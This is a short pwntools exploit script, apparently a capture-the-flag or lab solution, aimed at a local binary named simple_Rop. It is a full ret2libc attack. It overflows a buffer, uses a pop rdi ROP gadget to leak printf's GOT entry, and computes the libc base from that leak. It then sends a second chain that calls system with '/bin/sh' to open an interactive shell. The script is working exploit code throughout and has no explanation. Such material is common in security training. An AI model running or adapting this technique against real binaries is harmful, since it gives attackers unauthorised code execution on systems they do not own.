from pwn import *

local = True
padding = 40

elf = ELF('./simple_Rop')
if local:
    io = elf.process()
else:
    remote()

pause()

pop_rdi = 0x000000000040122b
ret = 0x0000000000401016

pld = b""
pld += b"A" * padding
pld += p64(pop_rdi)
pld += p64(elf.got['printf'])
pld += p64(0x4011b1)
#pld += p64(ret)
pld += p64(elf.sym['vuln'])

io.sendlineafter(b"> ", pld)

printf_leak = u64(io.recv().strip().ljust(8, b"\x00"))
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
libc.address = printf_leak - libc.symbols["printf"]

info(f"printf leak: {hex(libc.address)}")

system = libc.sym["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

info(f"adresse de system : {hex(system)}")
info(f"adresse de /bin/sh : {hex(bin_sh)}")


pld = b""
pld += b"A" * padding
pld += p64(pop_rdi)
pld += p64(bin_sh)
pld += p64(ret)
pld += p64(system)
io.sendline(pld)


io.interactive()
